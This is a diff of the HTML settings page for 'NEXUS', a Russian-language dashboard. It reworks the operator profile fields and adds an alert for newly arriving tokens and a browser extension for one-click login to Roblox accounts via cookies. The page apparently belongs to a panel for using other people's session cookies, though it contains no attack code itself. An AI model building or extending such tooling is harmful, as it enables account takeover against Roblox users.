@@ -2,117 +2,159 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>NEXUS — Настройки</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="assets/style.css?v=160">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="assets/style.css?v=236">
 </head>
 <body>
   <div class="sidebar-layout">
     <div id="sidebarSlot"></div>
+    
     <main class="main-content">
       <div class="top-bar">
-        <h1 class="page-title">Настройки</h1>
+        <div>
+          <h1 class="page-title">Настройки</h1>
+        </div>
       </div>
-  <div class="container" style="max-width:1100px; margin:0 auto; padding-top:2rem;">
-    <div class="settings-grid">
-      
-      <!-- LEFT COLUMN: Profile & Personalization -->
-      <div class="settings-col">
-        <h2 class="settings-section-title">Профиль и Персонализация</h2>
-        
-        <div class="settings-card avatar-card">
-          <div class="avatar-upload-large" id="previewAvatar" onclick="document.getElementById('avatarFileInput').click()">
-            <!-- This will be populated by JS (emoji or img) -->
-            ??
-          </div>
-          <div class="avatar-controls">
-            <input type="file" id="avatarFileInput" accept="image/png, image/jpeg, image/webp" style="display:none;">
-            <button class="btn-secondary btn-sm" id="btnResetAvatar">Сбросить фото</button>
-          </div>
-          
-          <div class="emoji-picker-compact" id="emojiPicker">
-            <button class="emoji-btn" data-emoji="??">??</button>
-            <button class="emoji-btn" data-emoji="??">??</button>
-            <button class="emoji-btn" data-emoji="??">??</button>
-            <button class="emoji-btn" data-emoji="??">??</button>
-            <button class="emoji-btn" data-emoji="?">?</button>
-            <button class="emoji-btn" data-emoji="??">??</button>
-            <input type="text" class="settings-input premium-input emoji-custom-input" id="avatarInput" maxlength="8" placeholder="Свой эмодзи">
-          </div>
-        </div>
 
-        <div class="settings-card">
-          <label class="settings-label">Отображаемое имя</label>
-          <input type="text" class="settings-input premium-input" id="displayName" maxlength="32" placeholder="Как тебя видят">
+      <div class="container" style="max-width: 960px; margin: 0 auto;">
+        <div class="settings-grid">
           
-          <label class="settings-label" style="margin-top:1.5rem;">Статус / О себе</label>
-          <input type="text" class="settings-input premium-input" id="bio" maxlength="120" placeholder="Например: Root Admin">
-          
-          <!-- Hidden preview elements to keep JS happy -->
-          <div style="display:none;">
-            <span id="previewName"></span>
-            <span id="previewBio"></span>
-            <img id="uploadPreviewImg" src="">
-            <span id="uploadPreviewPlaceholder"></span>
-          </div>
-        </div>
-
-        <div class="settings-card">
-          <label class="settings-label">Цвет акцента</label>
-          <div class="color-picker-premium" id="colorPicker">
-            <button class="color-dot" data-color="#00f0ff" style="background:#00f0ff;"></button>
-            <button class="color-dot" data-color="#00ff88" style="background:#00ff88;"></button>
-            <button class="color-dot" data-color="#ff007f" style="background:#ff007f;"></button>
-            <button class="color-dot" data-color="#ff9f1c" style="background:#ff9f1c;"></button>
-            <button class="color-dot" data-color="#ffd60a" style="background:#ffd60a;"></button>
-            <button class="color-dot" data-color="#bd00ff" style="background:#bd00ff;"></button>
-            <div class="custom-color-wrapper">
-              <input type="color" class="settings-color-input" id="themeColor" value="#00f0ff">
+          <!-- LEFT COLUMN: Profile & Interface -->
+          <div class="settings-col">
+            <h2 class="settings-section-title">Профиль оператора</h2>
+            
+            <!-- Avatar Card -->
+            <div class="settings-card avatar-card">
+              <div class="avatar-upload-large" id="previewAvatar" onclick="document.getElementById('avatarFileInput').click()" title="Загрузить фото оператора">
+                👤
+              </div>
+              <div class="avatar-controls">
+                <input type="file" id="avatarFileInput" accept="image/png, image/jpeg, image/webp" style="display:none;">
+                <button class="btn-secondary" id="btnResetAvatar" style="padding: 4px 10px; font-size: 0.78rem;">Сбросить фото</button>
+              </div>
+              
+              <div class="emoji-picker-compact" id="emojiPicker">
+                <button class="emoji-btn" data-emoji="🦊">🦊</button>
+                <button class="emoji-btn" data-emoji="🐉">🐉</button>
+                <button class="emoji-btn" data-emoji="🔗">🔗</button>
+                <button class="emoji-btn" data-emoji="🎤">🎤</button>
+                <button class="emoji-btn" data-emoji="👤">👤</button>
+                <input type="text" class="settings-input" id="avatarInput" maxlength="8" placeholder="Свой эмодзи" style="width: 105px; text-align: center; padding: 5px 8px; font-size: 0.8rem;">
+              </div>
             </div>
-          </div>
-        </div>
-      </div>
 
-      <!-- RIGHT COLUMN: Security & Modules -->
-      <div class="settings-col">
-        <h2 class="settings-section-title">Безопасность и Модули</h2>
-
-        <!-- Separate Extension Card -->
-        <div class="settings-card extension-card" style="border: 1px solid rgba(0, 240, 255, 0.2); background: rgba(0, 240, 255, 0.03); border-radius: 12px; padding: 1.5rem; display: flex; flex-direction: column; gap: 1rem; margin-bottom: 1.5rem;">
-          <div style="display:flex; align-items:center; gap:12px;">
-            <div style="font-size:2rem; background:rgba(0, 240, 255, 0.1); border-radius:10px; width:48px; height:48px; display:flex; align-items:center; justify-content:center;">??</div>
-            <div>
-              <h3 style="margin:0; font-size:1.1rem; color:var(--accent);">Расширение NEXUS</h3>
-              <p style="margin:4px 0 0 0; font-size:0.85rem; color:rgba(255,255,255,0.6);">Необходимо для автоматического входа в аккаунты.</p>
+            <!-- Identity Card -->
+            <div class="settings-card">
+              <label class="settings-label">Отображаемое имя</label>
+              <input type="text" class="settings-input" id="displayName" maxlength="32" placeholder="Имя оператора">
+              
+              <label class="settings-label" style="margin-top: 1.25rem;">Статус / Описание</label>
+              <input type="text" class="settings-input" id="bio" maxlength="120" placeholder="Например: Главный администратор">
+              
+              <div style="display:none;">
+                <span id="previewName"></span>
+                <span id="previewBio"></span>
+                <img id="uploadPreviewImg" src="" alt="">
+                <span id="uploadPreviewPlaceholder"></span>
+              </div>
             </div>
+
+            <!-- Interface Preferences Card -->
+            <div class="settings-card">
+              <h3 style="font-size: 0.95rem; font-weight: 600; color: #fff; margin-bottom: 0.85rem;">Параметры интерфейса</h3>
+              
+              <div style="margin-bottom: 1rem;">
+                <label class="settings-label">Вид аккаунтов по умолчанию</label>
+                <select class="filter-select" id="prefDefaultView" style="width: 100%;">
+                  <option value="grid">Сетка (карточки с аватарами)</option>
+                  <option value="table">Компактная таблица</option>
+                </select>
+              </div>
+
+              <div style="margin-bottom: 1rem;">
+                <label class="settings-label">Интервал проверки данных</label>
+                <select class="filter-select" id="prefAutoRefresh" style="width: 100%;">
+                  <option value="5000">Каждые 5 секунд</option>
+                  <option value="15000">Каждые 15 секунд</option>
+                  <option value="30000">Каждые 30 секунд</option>
+                  <option value="0">Вручную (отключено)</option>
+                </select>
+              </div>
+
+              <div style="display: flex; align-items: center; justify-content: space-between; padding-top: 0.25rem;">
+                <div>
+                  <div style="font-size: 0.84rem; font-weight: 500; color: #fff;">Звуковое оповещение</div>
+                  <div style="font-size: 0.72rem; color: var(--text-muted);">Сигнал при поступлении нового токена</div>
+                </div>
+                <input type="checkbox" id="prefChime" style="width: 18px; height: 18px; accent-color: var(--gold); cursor: pointer;" checked>
+              </div>
+
+              <input type="hidden" id="themeColor" value="#3b82f6">
+            </div>
+
           </div>
-          <a href="downloads/NEXUS_extension.zip" class="btn-submit" style="display:block; text-align:center; text-decoration:none; background: linear-gradient(135deg, #00f0ff, #00b5c2); color:#000; font-weight:700; border-radius:8px; padding:10px; font-size:0.9rem; box-shadow: 0 4px 15px rgba(0, 240, 255, 0.15); border: none; cursor: pointer;" download>
-            ?? Скачать расширение NEXUS (.zip)
-          </a>
-        </div>
 
-        <div class="settings-card">
-          <label class="settings-label">Смена пароля</label>
-          <input type="password" class="settings-input premium-input" id="currentPassword" placeholder="Текущий пароль" style="margin-bottom:1rem;">
-          <input type="password" class="settings-input premium-input" id="newPassword" placeholder="Новый пароль">
-          <div class="settings-hint">Оставь пустым, если не хочешь менять</div>
-        </div>
+          <!-- RIGHT COLUMN: Extension & Security -->
+          <div class="settings-col">
+            <h2 class="settings-section-title">Безопасность и Расширение</h2>
 
-        <button class="btn-submit premium-btn-save" id="btnSave">
-          <span class="save-icon">??</span> Сохранить изменения
-        </button>
+            <!-- Extension Card -->
+            <div class="settings-card">
+              <div style="display: flex; align-items: flex-start; gap: 12px; margin-bottom: 1rem;">
+                <div style="width: 38px; height: 38px; background: var(--surface-active); border: 1px solid var(--border-hover); border-radius: var(--radius-sm); display: flex; align-items: center; justify-content: center; flex-shrink: 0; color: var(--gold);">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg>
+                </div>
+                <div>
+                  <h3 style="margin: 0; font-size: 0.95rem; font-weight: 600; color: #fff;">Браузерное расширение NEXUS</h3>
+                  <p style="margin: 4px 0 0 0; font-size: 0.78rem; color: var(--text-secondary);">
+                    Необходимо для мгновенного входа в Roblox-аккаунты в 1 клик через Cookie.
+                  </p>
+                </div>
+              </div>
+
+              <div style="background: #090c15; border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 10px 12px; margin-bottom: 1rem; font-size: 0.78rem; color: var(--text-secondary); line-height: 1.5;">
+                <div style="font-weight: 600; color: #fff; margin-bottom: 4px;">Как установить:</div>
+                <div>1. Скачайте и распакуйте архив <code style="color:var(--gold);">NEXUS_extension.zip</code></div>
+                <div>2. В браузере откройте <code style="color:#60a5fa;">chrome://extensions</code> (или edge://extensions)</div>
+                <div>3. Включите «Режим разработчика» и нажмите «Загрузить распакованное»</div>
+              </div>
+
+              <a href="downloads/NEXUS_extension.zip" class="btn-primary" style="display: block; text-align: center; text-decoration: none; padding: 10px;" download>
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
+                <span>Скачать расширение (.zip)</span>
+              </a>
+            </div>
+
+            <!-- Password Card -->
+            <div class="settings-card">
+              <label class="settings-label">Смена пароля оператора</label>
+              <input type="password" class="settings-input" id="currentPassword" placeholder="Текущий пароль" style="margin-bottom: 0.75rem;">
+              <input type="password" class="settings-input" id="newPassword" placeholder="Новый пароль">
+              <div style="font-size: 0.72rem; color: var(--text-muted); margin-top: 0.5rem;">
+                Оставьте пустым, если менять пароль не нужно.
+              </div>
+            </div>
+
+            <!-- Save Action Button -->
+            <button class="btn-primary" id="btnSaveSettings" style="margin-top: auto; padding: 12px; font-size: 0.9rem;">
+              Сохранить настройки
+            </button>
+
+          </div>
+
+        </div>
       </div>
-
-    </div>
+    </main>
   </div>
-  </main>
-  </div> <!-- end of sidebar-layout -->
 
   <div id="toast"></div>
 
-  <script src="assets/config.js?v=160"></script>
-  <script src="assets/app.js?v=160"></script>
-  <script src="assets/settings.js?v=160"></script>
+  <script src="assets/config.js?v=236"></script>
+  <script src="assets/app.js?v=236"></script>
+  <script src="assets/settings.js?v=236"></script>
 </body>
 </html>
